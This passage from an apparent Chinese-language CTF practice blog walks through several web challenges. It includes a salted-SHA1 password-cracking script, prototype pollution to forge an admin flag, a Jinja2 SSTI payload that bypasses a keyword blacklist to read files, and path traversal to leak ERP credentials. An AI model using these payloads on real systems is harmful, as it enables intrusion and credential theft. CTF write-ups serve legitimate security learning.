</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pdf_list</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pdf_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;wget &#39;</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">StringIO</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfpage</span> <span class="kn">import</span> <span class="n">PDFPage</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">TextConverter</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">PDFPageAggregator</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.layout</span> <span class="kn">import</span> <span class="n">LTTextBoxHorizontal</span><span class="p">,</span> <span class="n">LAParams</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfinterp</span> <span class="kn">import</span> <span class="n">PDFResourceManager</span><span class="p">,</span> <span class="n">PDFPageInterpreter</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">importlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">Request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pdf</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;pdf&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert_pdf_to_txt</span><span class="p">(</span><span class="n">path_to_file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">rsrcmgr</span> <span class="o">=</span> <span class="n">PDFResourceManager</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">retstr</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">codec</span> <span class="o">=</span> <span class="s1">&#39;utf-8&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">laparams</span> <span class="o">=</span> <span class="n">LAParams</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">device</span> <span class="o">=</span> <span class="n">TextConverter</span><span class="p">(</span><span class="n">rsrcmgr</span><span class="p">,</span> <span class="n">retstr</span><span class="p">,</span> <span class="n">codec</span><span class="o">=</span><span class="n">codec</span><span class="p">,</span> <span class="n">laparams</span><span class="o">=</span><span class="n">laparams</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path_to_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">interpreter</span> <span class="o">=</span> <span class="n">PDFPageInterpreter</span><span class="p">(</span><span class="n">rsrcmgr</span><span class="p">,</span> <span class="n">device</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">maxpages</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">caching</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">pagenos</span><span class="o">=</span><span class="nb">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">PDFPage</span><span class="o">.</span><span class="n">get_pages</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">pagenos</span><span class="p">,</span> <span class="n">maxpages</span><span class="o">=</span><span class="n">maxpages</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">,</span><span class="n">caching</span><span class="o">=</span><span class="n">caching</span><span class="p">,</span> <span class="n">check_extractable</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">interpreter</span><span class="o">.</span><span class="n">process_page</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">retstr</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">device</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">retstr</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">pdf_path</span> <span class="o">=</span> <span class="n">get_pdf</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pdf_path</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Searching word in &#34;</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf_text</span> <span class="o">=</span> <span class="n">convert_pdf_to_txt</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">pdf_text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sha1_password</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">word</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;Salz!&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">sha1_password</span> <span class="o">==</span> <span class="s1">&#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Find the password :&#34;</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">find_password</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞adminÁöÑÂØÜÁ†Å‰∏∫ThinJerboa</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174631363.png"
	width="734"
	height="415"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174631363_hu2753796627976422042.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123174631363_hu17782598199608423986.png 1024w"
	loading="lazy"
	
		alt="image-20250123174631363"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="424px"
	
></p>
<h2 id="wife_wife">wife_wife
</h2><p>Âõ†‰∏∫‰∏ç‰ºöÂÅöÁõ¥Êé•Áúãwp</p>
<p>ËøôÈ¢òËÄÉÁöÑÊòØÂéüÂûãÈìæÊ±°Êüì</p>
<p>ÂÖàÊ≥®ÂÜåË¥¶Âè∑</p>
<p>ÊäìÂåÖ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124162941018.png"
	width="1489"
	height="592"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124162941018_hu9827970049933565382.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124162941018_hu1021539305789185016.png 1024w"
	loading="lazy"
	
		alt="image-20250124162941018"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="603px"
	
></p>
<p>Êúâ‰∏Ä‰∏™isAdminÁöÑÂèÇÊï∞ÈúÄË¶ÅÊàë‰ª¨‰º™ÈÄ†Êàêtrue</p>
<p>ËøôÈáåÂ∞±Ë¶ÅÂú®Ê≥®ÂÜåÁöÑÊó∂ÂÄôÊ∑ªÂä†‰∏Ä‰∏™protoÂ≠óÂÖ∏</p>
<p>Â∞ÜisAdminÂèòÊàêtrueÔºåÂõ†‰∏∫isadminÂéüÊù•Â∞±ÂàõÂª∫‰∫ÜÔºåÊâÄ‰ª•ÂêéÈù¢Ëøô‰∏™Êìç‰ΩúÂ∞±‰ºöÊääÂâçÈù¢ÁöÑÂÄºÁªôÊ±°Êüì‰∫Ü</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124163846334.png"
	width="1460"
	height="725"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124163846334_hu5018211489146481537.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124163846334_hu12739474604345764152.png 1024w"
	loading="lazy"
	
		alt="image-20250124163846334"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="483px"
	
></p>
<p>Áî±‰∫éÂâçÈù¢ÁöÑÊó∂ÂÄôÁõ¥Êé•ÊîπisAdminÁöÑÂÄºÊòØÈúÄË¶ÅÈÇÄËØ∑Á†ÅÁöÑÔºåÊàë‰ª¨‰πüË¶ÅÈöè‰æøÂ°´‰∏Ä‰∏™ÈÇÄËØ∑Á†Å</p>
<p>Êé•‰∏ãÊù•ÁôªÂÖ•Â∞±ÂæóÂà∞flag</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124164155015.png"
	width="765"
	height="524"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124164155015_hu14470317910239312636.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124164155015_hu8688121062085761409.png 1024w"
	loading="lazy"
	
		alt="image-20250124164155015"
	
	
		class="gallery-image" 
		data-flex-grow="145"
		data-flex-basis="350px"
	
></p>
<h2 id="confusion1">Confusion1
</h2><p>ÁÇπÂºÄÁïåÈù¢ÁöÑlogin.phpÂíåregister.phpÈÉΩÊ≤°‰∏úË•øÔºå‰ΩÜÊòØÊü•ÁúãÊ∫êÁ†ÅÂèëÁé∞flagÂ≠òÂú®ÁöÑ‰ΩçÁΩÆ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171540324.png"
	width="893"
	height="125"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171540324_hu13188427992632067401.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124171540324_hu10377066621305545180.png 1024w"
	loading="lazy"
	
		alt="image-20250124171540324"
	
	
		class="gallery-image" 
		data-flex-grow="714"
		data-flex-basis="1714px"
	
></p>
<p>Áî±‰∫éÈ¢òÁõÆÊèèËø∞ÂíåÂõæÁâá</p>
<p>Êé®ÊµãÊòØpythonÁöÑSSTIÊ≥®ÂÖ•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171549429.png"
	width="1504"
	height="657"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171549429_hu2390030814885764486.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124171549429_hu14648147284119273371.png 1024w"
	loading="lazy"
	
		alt="image-20250124171549429"
	
	
		class="gallery-image" 
		data-flex-grow="228"
		data-flex-basis="549px"
	
></p>
<p>Á°ÆÂÆûÂõûÊòæ‰∫Ü49ÔºåÈÇ£‰πàÂ∞±ÊòØjinja2Ê®°ÊùøÁöÑSSTIÊ≥®ÂÖ•</p>
<p>ËøôÈáåÂèëÁé∞Â•ΩÂ§öÂÖ≥ÈîÆËØçÈÉΩË¢´ËøáÊª§</p>
<p>classÔºåsubclasses,readÁ≠â</p>
<p>Âà©Áî®request.argsÁªïËøáËæìÂÖ•ÈªëÂêçÂçïÔºåËøõË°åÊ≤ôÁÆ±ÈÄÉÈÄ∏</p>
<p>Ê†πÊçÆÊàë‰πãÂâçÁöÑÁ¨îËÆ∞</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124173214109.png"
	width="1045"
	height="141"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124173214109_hu10813701933560700802.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124173214109_hu9013156956733065848.png 1024w"
	loading="lazy"
	
		alt="image-20250124173214109"
	
	
		class="gallery-image" 
		data-flex-grow="741"
		data-flex-basis="1778px"
	
></p>
<p>ÂÖàÊûÑÈÄ†ËÉΩÊãøÂà∞flagÁöÑËØ≠Âè•ÂÜçÁî®request.argsÊõøÊç¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">a</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">b</span><span class="p">][</span><span class="mi">2</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">c</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;</span><span class="p">)[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">d</span><span class="p">]()}}</span><span class="err">?</span><span class="n">a</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">d</span><span class="o">=</span><span class="n">read</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞flag</p>
<h2 id="ezbypass-cat">ezbypass-cat
</h2><p>ËøõÊù•ÁôªÂÖ•ÁïåÈù¢ÔºåÂ∞ùËØïsqlÊ≥®ÂÖ•Êó†Êûú</p>
<p>‰∏äÈù¢ÊòØlogin.html</p>
<p>ÊÉ≥Âà∞loginÁôΩÂêçÂçï</p>
<p>Áõ¥Êé•ÊãºÊé•../flag.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125310146.png"
	width="1506"
	height="801"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125310146_hu5389296491435100883.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125310146_hu10159687339314941224.png 1024w"
	loading="lazy"
	
		alt="image-20250125125310146"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="451px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125644363.png"
	width="1914"
	height="576"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125644363_hu2695775261578656193.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125644363_hu5052536982706775131.png 1024w"
	loading="lazy"
	
		alt="image-20250125125644363"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="797px"
	
></p>
<p>ÁΩëÁ´ôjsËÑöÊú¨ÈáåÈù¢ÊúâÂçéÂ§èerp,ÂçéÂ§èerp‰∏≠ÊúâÊé•Âè£<code>user/getAllList</code>ÔºåÈÄöËøáÁôΩÂêçÂçïÁöÑÁõÆÂΩïÁ©øË∂äÔºåËÆøÈóÆËØ•Êé•Âè£ÔºåÂæóÂà∞Áî®Êà∑ÂêçÂíåÂØÜÁ†Å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125753388.png"
	width="1584"
	height="847"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125753388_hu7855387279745350948.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125753388_hu8210229150505034628.png 1024w"
	loading="lazy"
	
		alt="image-20250125125753388"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="448px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125906834.png"
	width="1574"
	height="824"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125906834_hu17449227822188967656.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125906834_hu2653966921441084466.png 1024w"
	loading="lazy"
	
		alt="image-20250125125906834"
	
	
		class="gallery-image" 
		data-flex-grow="191"
		data-flex-basis="458px"
	
></p>
<p>ÁôªÂÖ•ÂêéÊãøcookie‰∏≠ÁöÑjession idÊù•ÁõÆÂΩïÊâ´ÊèèÔºåÊâ´Âà∞flag.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130418597.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130418597_hu9206984213303438607.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125130418597_hu1337212331514896637.png 1024w"
	loading="lazy"
	
		alt="image-20250125130418597"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130503206.png"
	width="1865"
	height="659"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130503206_hu13581192516899694976.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125130503206_hu8518944493638560831.png 1024w"
	loading="lazy"
	
		alt="image-20250125130503206"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="679px"
	
></p>
<h2 id="ez_curl">ez_curl
</h2><p>‰∏äÊù•‰ª£Á†ÅÂÆ°ËÆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="s1">&#39;http://back-end:3000/flag?&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">headers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$headers</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$offset</span> <span class="o">=</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$headers</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="s1">&#39;:&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$headers</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$value</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$headers</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="nv">$offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="s1">&#39;true&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;try hard&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$params</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">.=</span> <span class="nx">http_build_query</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">.=</span> <span class="s1">&#39;&amp;admin=false&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_TIMEOUT_MS</span><span class="p">,</span> <span class="mi">5000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_NOBODY</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÈôÑ‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
